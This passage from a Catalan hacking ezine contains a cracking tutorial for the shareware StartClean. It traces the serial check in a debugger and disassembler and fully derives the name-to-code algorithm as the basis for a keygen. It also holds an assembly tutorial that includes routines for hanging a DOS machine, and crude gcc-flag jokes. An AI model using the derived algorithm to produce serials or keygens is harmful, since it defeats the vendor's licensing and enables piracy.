diu ke es obligatori registrar-se i pagar $10 ke segurament no ens venen de gust 
de pagar nomes per treure la finestreta inicial. 


Intencio
---------
	L'objectiu basic es treure la finestreta, cosa ke podem fer de varies
 maneres (de facil a dificil):

--Registrant-nos i posant un nom i codi correctes ($10) [Descartat]

--Enganyant el programa al principi quan comprova si esta registrat.
[Patch cutre]

--Enganyant al programa quan comprova el nom i pass. De rebot hauriem de
canviar l'anterior, ja ke en iniciar, el programa mira al registre de windows
si esta registrat o no.--> Si fem l'anterior akest es inutil.
[Patch cutre]

--Mirant els registres just quan compara el num bo i el dolent. 
<< Interessant >>

--Introduint-nos a les entranyes del programa i saber kè li fa al nom ke
posem per convertir-lo en el numero correcte. (trobar i interpretar
l'algorisme) << +++Interessant >>

       Veient les possiblitats, crec ke es molt mes elegant trobar el numero
correcte ke no nomes patchejar el programa, aixi ke nomes explicare les 2
ultimes opcions.

 1.Començem
------------
Abans ke res ens inventarem un nom i un codi. Per exemple
 ________________________
|Name: Quick             | 
|Code: 123456 (inventat) |
'------------------------'

Per captar el text ke hem escrit el programa crida unes funcions de windows ke 
simplifiquen el codi. Akestes son:

16 bits			32 bits
GetDlgItemText          GetDlgItemTextA
			GetDlgItemTextW (poc utilitzada)
GetWindowText		GetWindowTextA
			GetWindowTextW (poc utilitzada)

Les dues fan akesta funcio de recollir el text. Doncs el ke farem es ke el
Soft Ice ens aturi el programa just quan akest reculli el text, aixi veurem
ke fa amb el text.
CTRL-D i a SoftIce posem:

BPX GetDlgItemTextA
BPX GetDlgItemText
BPX GetWindowTextA
BPX GetWindowText

ke significa Break Point on eXecute (BPX), ke salti quan aixo s'executi.
Els posem tots per encertar-lo segur, la bona es GetDlgItemTextA.
Doncs sortim del SoftIce i premem OK. S'obre el SoftIce i veiem el codi
ke correspon a la funcio mateixa, dins del USER32.DLL, ens interessa saber
des d'on ha estat cridada, per aixo premem F11 ke ens porta a:

	0137:004011AD		MOV ESI, [USER32!GetDlgItemTextA]
	0137:004011B3		CALL ESI 
-->	0137:004011B5		LEA EAX, [ESP+10]

Veiem ke crida ESI a la direccio 4011B3. Per tenir una visio mes global anem
al w32dasm i un cop desensamblat l'executable saltem a la direccio de codi ke
conte la crida de la funcio: a :004011B3
Comentare per sobre les linies + importants:


:0040118B  push 00000100                        ;Guarda el tamany maxim de  
:00401190  movsb                                ;la variable (name)
:00401191  lea edi, dword ptr [esp+00000137]
:00401198  push 00406130                        ;Guarda la Direccio del Buffer
      ...  ...                                  ;on es posara el text (name)
:004011A7  push 00000405			;Identificador de control
:004011AC  push edi				;Handle de la caixa de dialeg

* Reference To: USER32.GetDlgItemTextA, Ord:00EDh
                                  |
:004011AD  mov esi, dword ptr [004092D8]
-->:004011B3  call esi                          ;Crida GetDlgItemTextA i posa 
:004011B5  lea eax, dword ptr [esp+10]          ;el "Name" a la dir. :00406130 
:004011B9  push 00000100                        ;Tamany maxim del codi
:004011BE  push eax                             ;direccio pel num (esp+10)
:004011BF  push 00000406                        ;identificador de control
:004011C4  push edi                             ;Handle de la caixa de text
:004011C5  call esi                             ;GetDlgItemTextA, posa el codi
:004011C7  push 00406030                        ;a esp+10, ke es 00406030
:004011CC  push 00406130
:004011D1  call 00401280                      

        Akest call ens porta a una rutina ke transforma el nom en el codi
correcte. Despres la veurem a fons. Ens retorna el codi correcte a EAX i el
ke hem introduit segueix a :00406030

:004011D6  lea eax, dword ptr [esp+18]
:004011DD  push eax			       ;Guarda el codi correcte (pila)
:004011DE  push 00406030		       ;Guarda el codi introduit

* Reference To: KERNEL32.lstrcmpA, Ord:0269h
                                  |
:004011E3  Call dword ptr [00409220]	       ;lstrcmpA : Compara els dos codis
:004011E9  test eax, eax		       ;i si no son iguals
-->:004011EB  jne 00401271		       ;salta a :00401271

etc...

* Reference To: ADVAPI32.RegCreateKeyExA, Ord:00C6h
* Reference To: ADVAPI32.RegSetValueExA, Ord:00ECh
* Possible StringData Ref from Data Obj ->"Name"
* Possible StringData Ref from Data Obj ->"Code"

Si els codis son iguals crea unes claus al registre a 

Hkey_Current_User/Software/StartClean
				'-- Configuration
					'-Name = Nom
					'-Code = Codi correcte

Pq ho guarda? Doncs pq aixi cada vegada ke iniciem el programa pot comprovar si
ha estat registrat anteriorment, tot i així torna a fer la comprovació, no fos
cas ke haguessim creat 2 claus qualsevols al registre (ke mamon eh! xD)

Molt bé. Si tenim curiositat podem mirar el valor del registre EAX just abans de
fer la comprovacio. Alla hi ha el codi correcte pel nom k hem introduit.

  Ja podem registrar el programa, pero seriem capaços de trobar l'algorisme ke
transforma el nom en codi???  CLAR!!!!!
  No consisteix en res mes ke interpretar la subrutina ke crida el programa en el
punt concret:   
	:004011D1  call 00401280

Nomes hem d'anar a 00401280 i mirar kè hi ha alla...

2. Interpretem els algoritmes
-----------------------------
2.1-Funcions
============
Abans d'interpretar el codi fixem-nos ke fa crides a 3 funcions:

-USER32.wsprintfA
-USER32.CharNextA
-KERNEL32.lstrcatA

 Hem de tenir en compte ke estem tractant variables d'una manera molt concreta, i 
per aixo hem de tenir molt clar ke fa cada una d'akestes funcions.
 Cal dir ke tenen parametres, i ke per guardar-los els posem a la pila en l'ordre 
invers, no entro a fons en aixo pq aixo esta explicat a molts manuals.
L'us de les funcions es akest:

 wsprintfA  Adressa_de_sortida  Adressa_cadena_caracters
-------------------------------------------------------- 
 Li donem l'adressa on hi ha una cadena (per exemple el Nom) i ens retorna el
numero de caracters ke te la cadena a la direccio de sortida.
exemple:
ECX=0
EBX=QUiCKSHOT
 wsprintfA  ECX  EBX 
tindrem:
 ECX=9 (9 lletres)

 CharNextA Adressa_d'un_caracter
--------------------------------
A la mateixa adressa ens dona la direccio del següent caracter de la cadena.
Per exemple: 
Tenim a la direccio 406130 la cadena Quick
el caracter a ke apunta 406130 es la "Q", si apuntem a 406131 el caracter es la "u",
i aixi successivament.

;EAX=406130
 CharNextA EAX
;EAX=406131

En ASM seria:
 PUSH EAX
 CALL CharNextA

Si fessim un bucle tantes vegades com lletres hi han, podriem treballar amb cada 
lletra per separat i fer operacions amb els seus caracters ASCII...

 lstrcatA AdressaVar1 AdressaVar2
---------------------------------
Afegeix la Var2 a la Var1. Retorna un punter al buffer on es troba la variable nova.
Tot i aixi akesta funcio no es imprescindible per entendre les transformacions.


 movsx  Direccio_ASCII_hex   Direccio_Caracter 
----------------------------------------------
 Es una ordre d'ASM. Ens posa el valor ASCII del caracter ke apunta el 2n param. a 
la direccio del 1r parametre, en hexadecimal.



2.2-Algorismes
==============
Interpretar el codi es força llargot, aixi ke optare per saltar-me tot el ke no 
es basic i veure kin es l'algoritme, o algoritmes ke utilitza.
El codi esta format per 4 cadenes de numeros, separades per guions.

Per exemple: Quick té el codi 1124-10286-2355-457
                                1a   2a   3a   4a cadena

 Cada cadena te el seu algoritme i ho fa a partir del nom i de les transformacions
dels valors ASCII de cada caracter.

1a Cadena
---------
Mirem ke fan els registres abans de res:

- EAX apunta a la direccio de memoria on tenim la primera lletra del nom d'usuari.
- EDI = "USER32.CharNextA", es per fer els CALLs.
- EBP = 6A (106 en decimal), valor inicial.
- ECX = on es posara el valor ASCII en hex. del caracter al qual apunta EAX.
	Ho fara l'ordre  "movsx ecx, byte ptr [eax]"


* Reference To: USER32.CharNextA, Ord:001Eh
                                  |
:004012C7  mov edi, dword ptr [004092DC]    ; EDI = "USER32.CharNextA"
:004012CD  cmp byte ptr [ebx], 00	    ; Mira ke la variable no sigui nula	
:004012D0  je 004012E1			    ; Si es nul.la, salta.

* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:004012DF(C)
|
:004012D2  movsx ecx, byte ptr [eax]	    ; ECX=ASCII del caracter a EAX
:004012D5  push eax			    ; Guarda EAX (param. del CharNextA)
:004012D6  lea ebp, dword ptr [ebp+2*ecx]   ; EBP = EBP + 2*ECX
:004012DA  call edi			    ; CharNextA (EAX = EAX+1)
:004012DC  cmp byte ptr [eax], 00           ; Comprova ke el seguent valor
					    ; no sigui nul.
:004012DF  jne 004012D2			    ; 

Si si el valor ASCII del seguent caracter no es nul, salta fent un bucle i
repetint el proces.
 
 EBP va acumulant els valors a cada bucle. En akest cas EBP ens acabara donant
la 1a cadena, just en sortir del bucle.
Ara explicare ben be ke fa, a les seguents cadenes anire mes al gra.

O sigui: Tenim el nom "Quick" a EAX.
En ASCII Quick es: (mirar taules ASCII)	

  Q    u     i    c    k
[81] [117] [105] [99] [107]  en decimal.
[51] [ 75] [ 69] [63] [ 6B]  en hexadecimal.


Si ara, en decimal, calculem manualment el ke fa el bucle farem:

EBP = EBPinicial(6A) + 2*[Valor ASCII del 1r caracter (Q)]
EBP = 106 + 2*81 = 268 (10C en hex)
Comprova ke el seguent valor no sigui nul: u(117)=0? NO, doncs salta.

Salta i torna a fer l'operacio, pero acumulant el valor de EBP.
EBP = EBPanterior(268) + 2*[Valor ASCII del 2n caracter (u)]
EBP = 268 + 2*117 = 502
Comprova ke el seguent valor no sigui nul: i(105)=0? NO, doncs salta.

Salta i torna a fer l'operacio, pero acumulant el valor de EBP.
EBP = EBPanterior(502) + 2*[Valor ASCII del 3r caracter (i)]
EBP = 502 + 2*105 = 712
Comprova ke el seguent valor no sigui nul: c(99)=0? NO, doncs salta.

Salta i torna a fer l'operacio, pero acumulant el valor de EBP.
EBP = EBPanterior(712) + 2*[Valor ASCII del 4t caracter (c)]
EBP = 712 + 2*99 = 910
Comprova ke el seguent valor no sigui nul: k(107)=0? NO, doncs salta.

Salta i torna a fer l'operacio, pero acumulant el valor de EBP.
EBP = EBPanterior(910) + 2*[Valor ASCII del 4t caracter (k)]
EBP = 910 + 2*107 = 1124
Comprova ke el seguent valor no sigui nul(no ens keda cap mes lletra)
0=0? SI, doncs no salta.

Guarda EBP a la pila.
Ja tenim la 1a cadena!!!!!! 
1124-2aCadena-3aCadena-4aCadena
----
I les altres?...

2a Cadena
---------
 Anem al gra:

Registres:
- EAX apunta a la direccio de memoria on tenim la primera lletra del nom d'usuari.
- EBX = 1124 (464 en hex.)
- EDI = CharNextA

Codi:
* Referenced by a (U)nconditional or (C)onditional Jump at Address:
|:00401318(C)
|
:00401308 movsx ecx, byte ptr [eax]      ; ECX=ASCII del caracter d'EAX 
:0040130B add ecx, ecx			 ; ECX= ECX + ECX
:0040130D push eax			 ; Guarda direccio caracter pel call
:0040130E lea edx, dword ptr [ecx+8*ecx] ; EDX= ECX + 8*ECX
:00401311 add ebp, edx			 ; EBP= EBP + EDX
:00401313 call edi			 ; EAX= EAX + 1
:00401315 cmp byte ptr [eax], 00         ; Es 0, l'ASCII del seguent
:00401318 jne 00401308			 ; caracter?

Si no ho es salta. Fa igual ke l'anterior, pero els calculs son diferents.


Es poden simplificar molt,
comencem pel final:

EBP= EBP + EDX
	    ' = ECX + 8*EXC = 9*ECX 
				 ' = ECX + ECX = 2*ECX	
EBP= EBP + 9*(2ECX) = EBP + 18*ECX

O sigui, resumint:

Cadena2 = bucle( EBPanterior[1124] + 18*[Valor ASCII de cada lletra])
            '- Per cada lletra, i EBP s'acumula.

En el cas de "Quick", dóna 10256 

3a Cadena
---------
 Fa el mateix tipus de bucle k els anteriors, pero EBP no s'acumula.
Aixo vol dir ke si esta en un bucle, es va sobreescrivint, excepte per
l'ultim valor...

Codi: 
Idem ke l'anterior, excepte lo comentat:

:00401341 movsx ecx, byte ptr [eax]           
:00401344 push eax
:00401345 lea ebp, dword ptr [ecx+4*ecx]      ; EBP = ECX + 4ECX = 5ECX
:00401348 lea ecx, dword ptr [ecx+2*ebp]      ; ECX = ECX + 2EBP
:0040134B lea ebp, dword ptr [2*ecx+00000001] ; EBP = 2ECX+ 1
:00401352 call edi
:00401354 cmp byte ptr [eax], 00
:00401357 jne 00401341

Simplificant ens keda:

EBP = 22*ECX + 1

Ke es va sobreescrivint. En akest cas nomes tindrem en compte el valor ASCII
de la ultima lletra del nom, en el cas de "Quick" sera la "k"

Cadena3= 22*(107) + 1 = 2355

4a Cadena
---------
Tambe sobreescriu EBP a cada volta pel bucle, per aixo nomes val l'ultima
lletra del nom:

Codi:
:00401380 0FBE08                  movsx ecx, byte ptr [eax]
:00401383 50                      push eax
:00401384 8D2C8D1D000000          lea ebp, dword ptr [4*ecx+0000001D]
:0040138B FFD7                    call edi
:0040138D 803800                  cmp byte ptr [eax], 00
:00401390 75EE                    jne 00401380

O sigui:

  EBP = 4*ECX + 1D
  1D en decimal es: 29

Per tant:
Cadena4 = 4*[Valor ASCII de l'ultima lletra] + 29

En el cas de "Quick", es la "k", de valor 107
Cadena4 = 4*107 + 29 = 457


I ja tenim la cadena per "Quick" !!!!
 1124-10286-2355-457


Ara falta programar el KeyGen...

3.Idea del KeyGen
-----------------
Mirar codi font adjunt

4.Curiositats
-------------
 Veient el codi, podem deduir ke ens donara el mateix valor el nom Quick ke
Qiuck o "cuiQk", mentre acabi en k i conservi les mateixes lletres i el
mateix nº de lletres.




5.Despedida
-----------
 Be, espero ke us hagi agradat i ke hagueu apres la idea de com interpetar
una rutina de verificacio i el seu algoritme.
Aki s'acaba l'article! Espero fer-ne molts mes. Qualsevol comentari, crítica
o dubte a  quik69@nettaxi.com

...em deixava el rollo:

|  L'autor d'akest article no es fa responsable
| de l'us ke es pugui fer dels coneixements aki
| exposats i tampoc anima a ningu a utilitzar
| copies registrades falsament.
|  Si voleu el programa pagueu-lo i blabla..

;P                         QUiCKSHOT

==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

$06$

&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&\
&&&                                       \
&&&   popASM v5.0 : tecniques i rutines    \     escrit per Pop.tPH
&&&                                         \
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&


En aquest article us explicare algunes rutines i tecniques per optimitzar,
o simplement per recorrer a rutines propies enlloc de les utilitzades pel
dos per realitzar operacions de forma mes rapida, com moviments de bytes,
dibuixar coses en pantalla, etc.


1)Rutines Basiques:

1.1) Inkey:
        O sigui, fer una rutina que el programa es quedi parat i que ens
        reaccioni sota la pulsacio d'una tecla determinada.

        bucle:
           xor ax,ax
           int 16h              ; AH=0, INT 16h = espera resposta de teclat
           cmp al, '1'
            je hepremut1        ; Si AL=tecla='1' llavors salta.
           jmp bucle
        hepremut1:

        Aquesta rutina pot tindre una variant, que consisteix en deixar-nos
        X intents, o sigui que el bucle no el faci eternament sino simplement
        X cops, aixo ho fariem escribint a dalt de tot MOV CX, XX (on XX es
        el nombre d'intents que volem deixar), i canviant el "jmp bucle" per
        un "loop bucle".


1.2) Bucle Doble
        El bucle doble seria un bucle dins d'un bucle, com podem fer aixo?
        amb push i pop.

          mov cx, 12   ; assignem CX=bucle1 i BP=bucle2
          mov bp, 10   ; ------------------------------
        bucle1:        ; ______________
          push cx      ;               \
          mov cx, bp   ;                \
        bucle2:        ; \_____ BUCLE2   \_____ BUCLE 1
        loop bucle2    ; /               /
          pop cx       ;                /
        loop bucle1    ; ______________/


1.3) Penjamenta:
        Es tracta de "penjar" la maquina, o fer que es quedi en un lloc sense
        fer cap operacio, aixo pot servir per fer per exemple. "Ara pots
        apagar el sistema" o "Ara t'acabo de penjar el sistema, fotet", o
        coses per l'estil. Aixo ho podem fer amb un simple salt a si mateix.

           JMP $  ; Jump Here ($=here)

        Si el nostre compilador no ens accepta aquest simbol podem fer:

        EmPenjo: JMP EmPenjo

        També podria ser curiós fer que la màquina es penjés encara més
        evitant poder-se interrumpir desde una interrupció (un debug pex.)
        Borrant la Flag de Int. (I) amb l'ordre "CLI".

        Recordo un cop més que el windows controla tot el que fa el dos i
        que per tant no es pot penjar una màquina amb windows d'aquesta
        forma sino que s'haurien de crear conflictes o executar ordres no
        existents en el xip.

1.4) Demanar una cadena de texte d'una llargaria X i grabar-la en un buffer
        marcat per nosaltres...us escric el codi (està extret del ShadowCript
        tb escrit per mi...pero bé el comentaré de nou.

llargaria equ 14                  ; 14 = llargaria del text
lea BP, buffer
call ReadText

buffer db 14 dup (0)

ReadText:
        mov cx, llargaria         ; CX = llargaria (CX s'utiltiza en bucles)
        xor si,si                 ; SI = 0 ; l'utilitzarem com a contador
    @a: xor ax, ax                ;        ; de caracters
        int 16h                   ; AX=0/INT 16h (demana caracter sense echo)
         cmp ah, 1Ch              ; es un return? (1Ch)
          je @end                 ; --- si: saltem al final
         cmp al, 8                ; es un backspace? (08h)
          je @backspace           ; --- si: saltem a backspace
        mov dx, ax                ; grabem en DX el valor de AX (AX= tecla)
        mov ah,2                  ; AH=2/INT21h = escriure caracter de DX
        int 21h                   ;  /// DH= codekey  /// DL= ascii key value
        mov byte ptr cs:[bp + si], dl ; grabem la tecla (DL) en el buffer
        inc si                    ; incrementem SI
        loop @a                   ; Fem un bucle a @a de CX vegades
        jmp @end                  ; Si bucle > CX salta al final
     @backspace:               ; BackSpace - rutina de borramenta
        inc cx                    ; inc cx (per putejar el bucle :)
        cmp si,0                  ; compara si estem al principi de la cadena
         je @a                    ; --- si:salta a @a
        dec si                    ; --- no: decrementa SI (contador caracters)
        mov ah, 2                 ; escriu el caracter 8 (backspace)
        mov dl, 8                 ;           per tirar enrera
        int 21h                   ;
        mov ah,2                  ; escriu un espai (per borrar el caracter)
        mov dl, ' '               ;
        int 21h                   ;
        mov ah,2                  ; torna a fer el backspace
        mov dl, 8                 ;            per situar-se un caracter
        int 21h                   ;            enrera
        jmp @a                    ; salta a @a
      @end:                       ; Finalitza la subrutina
        ret                       ; Retorna a la possici¢ segent del CALL


2) Optimitzacions de codi

2.1) Salts:
        Molts salts poden ser optimitzats...fixem-nos amb el que fa el tasm:

        codi original     codi ensamblat
        -------------     --------------
              JE 106           JNZ 104
                               JMP 106
         106: [...]       104: NOP
                               NOP
                               NOP
                          106: [...]

        Osti que lleig!!, aqui perdem bytes a pinyo! ;), que podem fer??,
        facil, haurem de substituir tots les E per Z, per exemple:
           JE  = JZ  ; Jump if Equal = Jump if Zero
           JNE = JNZ ; Jump if Not Equal = Jump if Not Zero.
        I pq aixo del zero i de l'equal?? doncs pq el que fa la ordre CMP
        (comparar) es fer un XOR entre les dos dades donades i el resultat
        no el graba en els registres sino nomes en les flags.
        M'explico:
          si fem:

          CMP AX, AX   -> AX = AX per tant saltara amb un JE
          XOR AX, AX   -> Que dona?? AX xor AX=0!! i per tant la flag de
                          zero (zeroflag (Z)) sera activada.
       I que passa amb els Jump if Above i Jump if Below (major, menor)
       aquests tb poden ser substituits, pq les flags CARRY (quan dona
       negatiu la operacio) i quan dona positiu no hi ha ni carry ni zero.
       Fem un bancal ;)

                   IGUAL MAJOR  MENOR  MENOR_O_IGUAL  MAJOR_O_IGUAL
       Carry Flag    0     0      1          1              0
       Zero  Flag    1     0      0          1              1

       Mes o menys seria aquesta la cosa.


2.2) Opcodes
        L'optimitzacio per OpCodes consisteix en canviar els opcodes
        (OPeration CODES) o ordres, per d'altres mes rapides i mes petites.

        no optimitzat: n_bytes        optimitzat: n_bytes
        -------------- -------        ----------- -------
        ADD AX, 1         3           INC AX         1
        SUB AX, 1         3           DEC AX         1
        MOV AX, 0         3           XOR AX,AX      2 o
                                      SUB AX,AX      2
        etc.


2.3) Crear subrutines:
        L'utilitzacio d'aquesta tecnica es bastant util, ja que s'aconsegueix
        reduir el tamany del programa en quantitat, i per tant sera mes facil
        revisar el programa, pq seran menys linies. Podrem utilitzar CALLs
        quan hi hagin rutines repetides moltes vegades, com per exemple, fem
        una rutina que graba els caracters que escribim en un buffer fins que
        apretem return, doncs si al llarg del programa aquesta rutina (que
        per cert, es una mica llargueta, si fiquem backspace...), podrem
        fer que cada cop que utilitzi la rutina faci aixo:

        lea bp, buffer ; == mov bp, offset buffer
        call ReadString

        I la subrutina agafaria bp, com a lloc on ha de grabar-ho tot, o sia
        el buffer. Aixo, a part d'accelerar el programa el redueix considera-
        blement de tamany.



2.4) Optimitzacio per debugger:
        Moltes vegades els compiladors es passen de llestos... :( i ens fan
        coses que no els diem, com per exemple si fem un PUSH 100h amb el
        TASM ell ens grabaria aixo:
          PUSH AX
          PUSH BP
          MOV BP,SP
          MOV WORD PTR SS:[BP+02], 0064
          POP BP
        Que si us fixeu ve a ser el mateix, pero molt mes llarg, doncs be,
        la gracia estaria ens substuir l'opcode "push 100h" del nostre codi
        per un DB (Define Byte) amb el valor de l'opcode que volem, en aquest
        cas, podem utilitzar el HACKdebugger, escribim "PUSH 100" i mirem
        els bytes equivalents: 68h, 00h, 01h
                fixemnos: 68h = PUSH
                          0001 = 100h (l'ensamblador graba els valors de WORD
                                       invertits, per bytes. 00 01 = 0100h
        llavors en el codi fem:
                DB 68h, 00h, 01h ; PUSH 100h

        Pot ser interessant revissar el codi del nostre programa amb un
        debugger per revissar que cap ordre no ens l'hagi fet malament ni
        que tampoc ens hagi ficat NOPs pel mig, ja que aixo augmenta el temps
        de proces i el tamany del fitxer executable.

2.5) Utilització de flags:
        Una cosa que ens pot ser bastant util a l'hora de programar son les
        flags, potser al principi ens sembli una cosa la qual nomes treballa
        el sistema internament, no es aixi, ja que nosaltres tambe podem
        utilitzar les flags per moltes coses, com per exemple indicar estats
        d'algo en una subrutina. Us poso un exemple i vosaltres ja en
        desenvolupareu d'altres.

        call AX_igual_BX? ;------------------< crida a la subrutina
         jc AX_no_es_igual         ; si la carry flag esta 1 salta
         jmp AX_es_igual           ; sino salta a AX_es_igual

        AX_igual_BX?: ;------------------------< subrutina
         cmp ax, bx                ; compara ax i bx
          je son_iguals            ; salta si son iguals
          stc                      ; sino SeTeja la Carry flag (STC) C=1
          ret                      ; retorna el control de la subrutina
         son_iguals:               ;------------< son iguals
          clc                      ; neteja la Carry flag (CLearCarry) C=0
          ret                      ; torna

        Si, se que es un mal exemple perque no cal donar tantes voltes per
        ressoldre un problema d'aquesta mena, pero és un exemple no? :P

2.6) Canvi de compilador :)
        Si, m'heu sentit bé...potser us penseu que el millor compilador és
        el TASM...o si treballeu per win el MASM, doncs no es aixi, m'explico:
        contres del TASM: moltes ordres al compilar-les t'ho fa malament...
        només cal mirar el codi compilat, te l'omple de NOPs inutils i quan
        fas PUSHs <value> et fica una rutina per substituir-ho, i per tant
        ocupa molt més. contres del MASM: es de microsoft. Aixi doncs, que
        ens queda?... la meravella del NASM (Netwide Assembler), aquest programa
        compila i linka tot junt, i a sobre el cf és lliure i per tant podem
        emprar-ho en qualsevol micro, SO i condicions.

        Fem un petit resum de com treballar amb el nasm:
         1) No calen capceleres (res de .model .code i end, tot sobra)
         2) Per fer PUSH <value> cal ficar el tamany de la value, o sigui
            PUSH word 1234h per exemple.
         3) Podem compilar per .ELF, WIN32, MS-DOS (EXE/COM), BSD, etc.
        tot ho podeu llegir a l'ajuda o en els exemples adjunts al compilador.



3) Classe teorica...

3.1) INT 19h
        Aquesta interrupcio no la vam tractar en l'article anterior, aixi
        que us l'explicaré ara. No es que sigui gaire complexe, perque nomes
        te una funcio: reiniciar.

        Si l'executem desde ms2 es reiniciara la maquina, i si ho fem desde
        w12 es tancara la finestra. (busqueu-li utilitats :)

3.2) 32 BITS:
        Us enrecordeu quan us vaig dir que existien els registres de 32bits
        i que es marcaven amb una E al davant? o sia: AX -> EAX, i aixi amb
        tots.- Pero no us vaig dir com era aquest segment...pq nosaltres
        podem treballar amb 32 bits i utilitzar registres de 16 i fins i
        tot de 8 bits. *snif* - Aquest es l'esquema:

        .-------------------------.---------------.
        |       EAX               |                |
        |  .------------.         |  EsQuEmA Dels  |
        |  |         AX |         |     ReGiStReS  |
        |  |       .----|         '-----.          |
        |  |       AH  AL               |          |
        |  ##  ##  ##  ##               |          |
        '-------------------------------'----------'

3.3) VECTORS DE LES INTERRUPCIONS:
        Si vau seguir l'anterior article sobre ASM i vau entendre'l, estaria
        bé que l'ampliessiu...que fan les funcions 35h i 25h de la int 21h??

      Explico:
        -[ Coneixer el vector de la interrupció xxh ]-
         AH = 35h
         AL = xxh (valor de la interrupcio)
         INT 21H
          -> ens retorna el vector de la int en ES:BX

        -[ Establir el vector de la interrupció xxh ]-
         AH = 25h
         AL = xxh (valor de la interrupció)
         DS:DX = possició de la nova int.

        Pero realment d'on treuen aquests vectors? que son?
        -Els vectors son un segment i un offset de 16 bits cadascun
         (segment:offset) que apunten a una possició de memoria on esta
         la rutina que comprova la els valors i executa la funcio demanada
         en la interrupció que volguem, en pogues paraules:

        - Una interrupció es una mescla entre JMP xxxx:xxxx i CALL xxxx:xxxx
         que ens permet simplificar els codis (2 bytes = 5 bytes), les rutines
         i en poques paraules, la programació.


        Doncs bé, analitzem, si existeixen uns vectors...s'han de poder agafar
        d'alguna forma diferent a la de les funcions de les interrupcions, una
        forma que ens permeti accedir directament. Aquest mètode resideix en
        les taules de vectors, estan situades a:

        segment : offset
         0000h    4*int

        O sia: si volem saber el vector de la interrupció 21h fariem:
         MOV BX, 4   ; multiplicador
         MOV AX, 21h ; la interrupció
         MUL BX      ; calculem BX*AX (4*21h)
         MOV DI, AX  ; grabem AX en DI (només el DI es pot emprar com a punter
          PUSH 0000h
          POP  ES     ; ES=0000h
         MOV DS, WORD PTR ES:[DI+2] ; agafem el segment del vector en DS
         MOV DX, WORD PTR ES:[DI]   ; agafem el offset del vector en DX

        Ara mirem el doubleword de: 0000:0084 (vector de la int 21h)
         -> D7 2E E7 0A
        Analitzem:
         D7 2E -> WORD del offset = 2ED7h (els words els llegeix al reves)
        Analitzem:
         E7 0A -> WORD del segment = 0AE7h


        Si el que volem es establir el nou vector haurem de fer el mateix pero
        al revés, o sigui movent els valors al segment 0000:0000

        Canviem el vector de la int21h:
         MOV AX, segment
         MOV BX, offset
          PUSH 0000h
          POP  ES
         MOV WORD PTR ES:[DI+2], AX
         MOV WORD PTR ES:[DI], BX

3.4) HLT autentic:
        L'ordre HLT, li l'utilitzeu us adonareu que no serveix de res, que
        la maquina segueix funcionant, o sigui que no es para...la rao d'aixo
        es perque l'ordre halt pot ser tracejada per interrupcions i per tant
        ignorar-la per conseguir un sistema mes estable...pero com sempre es
        pot fer tot, nosaltres anularem les interrupcions: CLI (ClearInterrupt
        Flag) i despres l'executarem. Probem:

        >debug hlt.com
        -a
        1234:0100 CLI
        1234:0101 HLT
        1234:0102 STI
        1234:0103 MOV AH,4C
        1234:0105 INT 21
        1234:0107
        -rcx
        CX=0000
         7
        -w
        -q

        Explico com va el debug? primer fiquem entrem ficant el nom del
        fitxer, despres en el prompt del debug premem 'a' (assemble), que
        serveix per programar, llavors fiquem les ordres...quan acabem
        premem un return per tornar al prompt, escribim RCX (per marcar el
        tamany del fitxer) i li diem que es 7 ( 0107 - 0100 = 0007 ), ara
        fiquem 'w' (Write), o sigui Escriure en fitxer, i despres 'q' Quit.

        Si ara l'executem us adonareu com la maquina es queda totalment
        bloquejada


3.5) Paginatge: Segurament que haureu sentit parlar del paginatge, que es pot
        canviar desde la ordre MODE i tal...pero que es?...el paginatge es
        canviar l'us dels diversos rangs de memoria per usos determinats.
        Per exemple, la CGA te aquests paginatges:
         .--------.-----------------------------.
        | PAGE   (  Rang de memoria CGA a 80x25  \
         `--------`-------------------------------'
        .'  0     |     B800:0000   (standar)     |
        |   1     |     B900:0000                 |
        |   2     |     BA00:0000                 |
        |   3     |     BB00:0000                 |
        `---------`-------------------------------'



Doncs be, aixo ha estat tot per aquest article, i espero tancar haviat el
tema dels 16 bits per passar-me als sistemes de 32 bits (win/lin). Pq sino
ho faig la intel haviat sens menjara amb el nou micro de 64...glups-programes
industrials.


                                                        Ai Guanna Toch...
                                                            - Gigatron xD

((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
******************************************************************************
kuduk-vil-kuduk-vil-kuduk-vil-kuduk-vil-kuduk-vil-kuduk-vil-kuduk-vil-kuduk-xD
******************************************************************************
))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))

$07$

 |   |  |   |   \    |   __  |     \
 |   |  |   |        |  |    |  |_  )
  __ |  |   |  |\ /  |  |    |     /
 |   |  |_  |  | V   |  |    |  |\ \
_|  _| _____| _|    _| ______| _| \_\


Un altre cop torna la secció catxonda de la ezine. Esperem que us agradi,
encara que seguim reclamant la vostra col·laboració per poder-la ampliar
i fer-la una miqueta més llarga.


Aquest texte ha estat extret de hax0r news i l'hem traduït al català.

     
      Tot el camí:        gcc --entry
      Per orgasme:        gcc -O
      Mai millor:         gcc -O2
      Cruel:              gcc -Wall
      Pels vells hackers: gcc -fno-strength-reduce
      Travestis:          gcc -Wconversion
      Amb joguina:        gcc -pipe
      L'home a dalt:      gcc -traditional
      En espera:          gcc -quiet
      Explica com es fa:  gcc --verbose
      Amb dorgues:        gcc --user-dependencies
      Sense moure's:      gcc -static
      En Microsoft:       gcc -shared
      Cara per cara:      gcc --profile
      Primer amb la boca: gcc --preprocess
      Abans drogat:       gcc --prefix
      Malalt:             gcc --no-warnings
      Amb vibrador:       gcc --machine
      Amb extrangers:     gcc --language
      Amb cadenes:        gcc --force-link
      Amb SIDA:           gcc --extra-warnings
      Analisme:           gcc --dump
      Fer neteja:         gcc --debug
      Parlar pel dia:     gcc --comments
      Prendre el control: gcc --assert


====


S'ha ideat una nova unitat per mesurar la inteligència, el TAR, per
exemple, l'Einstein tindria un MegaTAR, una persona normal tindria un
TAR i la unitat més petita del sistema de mesura seria el miliTAR.


====

